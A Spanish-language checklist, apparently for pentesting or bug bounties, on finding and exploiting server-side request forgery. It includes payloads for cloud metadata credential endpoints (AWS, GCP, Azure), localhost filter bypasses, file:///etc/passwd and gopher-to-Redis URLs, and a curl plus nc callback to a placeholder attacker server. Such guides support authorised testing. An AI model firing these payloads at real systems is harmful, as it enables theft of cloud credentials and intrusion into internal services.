# SSRF — Server-Side Request Forgery

## Señales de entrada
- Parámetros que aceptan URLs: `url=`, `webhook=`, `callback=`, `redirect=`, `src=`, `endpoint=`.
- Funciones de fetch remoto: importar URL, preview de link, scraping, integraciones.
- Upload por URL.
- Integraciones con servicios externos (Slack, Zapier, webhooks).
- PDF/screenshot generators (suelen hacer fetch de la URL que le pasas).

## Metodología

### Paso 1: identificar puntos de entrada
```bash
# Buscar parámetros de URL en requests históricas
grep -E '(url|webhook|callback|src|endpoint|dest|target|proxy|load|fetch)=' urls.txt
```

### Paso 2: probar con servidor propio
```bash
# Levantar listener
nc -lvnp 8080
# O usar Burp Collaborator / interact.sh

# Payload básico
curl 'https://example.com/fetch?url=http://TU_SERVIDOR:8080/test'
```

### Paso 3: intentar acceso a metadata cloud
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Digital Ocean
http://169.254.169.254/metadata/v1/
```

### Paso 4: bypass de filtros
```
# Localhost
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://localhost/
http://0177.0.0.1/   (octal)
http://0x7f000001/   (hex)

# DNS rebinding
http://ssrf.example.com/  (resuelve a 127.0.0.1)

# Redirección abierta en el mismo dominio
https://example.com/redirect?url=http://169.254.169.254/

# Esquemas alternativos
file:///etc/passwd
dict://127.0.0.1:22
gopher://127.0.0.1:6379/_PING  (Redis)
ftp://127.0.0.1/
```

## SSRF ciego (Blind SSRF)
- No hay respuesta visible, pero el servidor hace la petición.
- Detectar con Burp Collaborator o interact.sh.
- Buscar en logs si recibes el request.
- Explotar con out-of-band: exfiltración DNS.

## Impacto alto
- Acceso a metadata cloud → credenciales IAM → RCE en infra.
- Acceso a servicios internos (Redis, Elasticsearch, admin panels).
- Port scanning de la red interna.
- SSRF a SMTP/FTP → relay de correo.

## Falsos positivos
- Server hace request pero no devuelve respuesta ni la usa (puramente async sin impacto).
- URL validada estrictamente y no hay bypass posible.

## Evidencia mínima
- Petición recibida en tu servidor externo (log de Collaborator).
- O respuesta del servidor con contenido de recurso interno.
- Para metadata: credenciales o tokens visibles en response.
